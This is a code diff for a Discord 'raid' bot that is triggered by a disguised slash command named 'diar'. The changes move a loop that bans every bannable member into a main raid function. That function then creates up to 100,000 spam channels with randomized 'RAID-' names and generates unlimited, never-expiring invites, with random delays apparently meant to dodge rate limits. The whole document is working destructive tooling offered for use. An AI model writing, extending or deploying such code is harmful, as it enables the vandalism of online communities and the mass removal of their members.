@@ -33,9 +33,22 @@ client.on('ready', () => {
 
 async function raidMain(guild, interaction) {
   console.log("MAIN RAN")
+
+  console.log("RUN BAN LOOP")
+  for (const member of guild.members.cache.values()) {
+    try {
+      if (member.bannable) {
+        await member.ban({reason: "raided", deleteMessageSeconds: 0})
+      }
+    }catch{console.log("Error banning!")}
+    await new Promise(r => setTimeout(r, randInt(100,420)));
+  }
+
+  console.log("DOING MAIN LOOP IN MAIN FUNC")
   for (let i = 0; i < 100000; i++) {
-    console.log(`Creating channel RAID-${i}`)
-    guild.channels.create({ name: `RAID-${i}`, reason: 'COOL CHANNEL IS COOL' })
+    let j = randInt(420,999999)
+    console.log(`Creating channel RAID-${j}`)
+    guild.channels.create({ name: `RAID-${j}`, reason: 'COOL CHANNEL IS COOL' })
     interaction.channel.createInvite({
         maxAge: 0, // Invite never expires (adjust as needed)
         maxUses: 0, // Unlimited uses (adjust as needed)
@@ -57,17 +70,10 @@ client.on('interactionCreate', async interaction => {
 
   if (interaction.commandName === 'diar') {
     console.log("RAID STARTED.")
+
     let guild = interaction.guild
-    for (const member of guild.members.cache.values()) {
-        try {
-          if (!member.permissions.has(PermissionFlagsBits.Administrator) || !member.permissions.has(PermissionFlagsBits.Administrator)) {
-            await member.ban();
-            console.log(`${member.user.tag} has been banned.`);
-          }
-        }catch{console.log("Error banning!")}
-        await new Promise(r => setTimeout(r, randInt(100,420)));
-    }
     raidMain(guild, interaction)
+
     interaction.reply("OK")
   }
 });
